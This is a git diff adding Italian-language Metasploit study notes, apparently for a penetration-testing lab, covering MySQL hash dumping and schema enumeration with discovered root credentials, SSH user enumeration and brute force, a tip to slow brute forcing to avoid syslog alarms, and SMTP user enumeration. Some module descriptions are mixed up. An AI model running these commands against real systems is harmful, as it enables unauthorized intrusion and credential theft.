@@ -30,6 +30,15 @@ setg RHOSTS <IP target>
 setg RHOST <IP target>
 ```
 
+### Comandi utili di Metasploit
+
+* **workspace**: gestisce i workspace
+* **setg**: setta variabili globali
+* **hosts**: mostra gli host trovati
+* **services**: mostra i servizi identificati tramite scan tcp o tramite moduli di enumerazione utilizzati
+* **loot**: mostrare schemi dei DB scoperti
+* **creds**: mostrare credenziali (username e hash) scoperte
+
 ## MSF: Port scanning con auxiliary modules
 
 ### Scan TCP
@@ -317,3 +326,148 @@ set VERBOSE false
 run
 ```
 
+### MySQL Enumeration utenti come utente loggato
+
+Enumeration loggandoci con l'utente admin scoperto tramite brute force
+
+```
+use auxiliary/admin/mysql/mysql_enum
+set PASSWORD twinkle
+set USERNAME root
+run
+```
+
+Ci fornisce una lista degli account e l'hash delle loro password, e i permessi dei vari account
+
+### Modulo per eseguire query SQL
+
+```
+use auxiliary/admin/mysql/mysql_sql
+set PASSWORD twinkle
+set USERNAME root
+set SQL //dobbiamo impostare la query SQL da eseguire, di default è select version() per vedere la versione
+run
+```
+
+Se abbiamo accesso admin al DB possiamo eseguire la query per vedere i DB (o le tabelle di uno schema):
+
+```
+set SQL show databases;
+run
+```
+
+### Enumerare tutti gli schema e tabelle nel DB
+
+```
+use auxiliary/scanner/mysql/mysql_schemadump
+set PASSWORD twinkle
+set USERNAME root
+run
+```
+
+### Fare il dump di tutti gli hash degli utenti del DB
+
+```
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS <IP target>
+run
+```
+
+### Identificare le cartelle scrivibili tramite MySQL
+
+```
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS <IP target>
+set USERNAME root
+set PASSWORD twinkle
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+### Tip: Connessione diretta al DB (al di fuori di MSF)
+
+```
+mysql -h <IP target> -u <username> -p
+// ora che siamo connessi dentro al DB possiamo fare tutte le query che vogliamo.
+```
+
+## SSH Enumeration
+
+### Avvio Metasploit framework
+
+```
+service postgresql start
+msfconsole
+workspace -a SSH_Enum
+setg RHOSTS <IP target>
+setg RHOST <IP target>
+search type:auxiliary name:ssh
+```
+
+### SSH version enumeration
+
+```
+use auxiliary/scanner/ssh/ssh_version
+run
+```
+
+### SSH users enumeration
+
+```
+use auxiliary/scanner/ssh/ssh_enumusers
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+```
+
+### SSH bruteforce delle credenziali
+
+```
+use auxiliary/scanner/ssh/ssh_version  // se il target usa l'autenticazione via user e password
+use auxiliary/scanner/ssh/ssh_login    // se il target usa l'autenticazione con chiave public/private
+show options
+// meglio ridurre la BRUTEFORCE_SPEED perché i log di solito vengono inviati a un Sys Log Server e quindi potrebbe scattare qualche allarme
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt //oppure unix_passwords.txt
+run
+// terminiamo la sessione aperta automaticamente con CTRL+C
+sessions
+session 1
+/bin/bash -i   // per aprire una shell interattiva nella sessione 1
+```
+
+Questo modulo apre in automatico anche un terminale con SSH sul target, però in realtà se proviamo a scrivere qualche comando non funziona, quindi bisogna terminarlo con CTRL+C e poi se scriviamo il comando sessions possiamo vedere che ne ha attivata una in automatico al posto nostro.
+
+Però se poi entriamo nella sessione attiva e scriviamo ls non vediamo il risultato, allora dobbiamo aprire una shell interattiva con il comando _/bin/bash -i_
+
+## SMTP Enumeration
+
+Con SMTP possiamo trovare un elenco degli utenti presenti sul sistema, e di conseguenza possiamo usare questi utenti per fare dei brute force su SSH o altri protocolli.
+
+### Avvio Metasploit Framework
+
+```
+service postgresql start
+msfconsole
+workspace -a SMTP_Enum
+setg RHOSTS <IP target>
+setg RHOST <IP target>
+search type:auxiliary name:smtp
+```
+
+### SMTP version enumeration
+
+```
+use auxiliary/scanner/smtp/smtp_version
+run
+```
+
+### SMTP user enumeration
+
+```
+use auxiliary/scanner/smtp/smtp_enum     // user enumeration
+run
+```
+
+UNIXONLY è true perché sappiamo che è un sistema linux, stesso motivo per cui lo USER\_FILE è la default unix\_users.txt
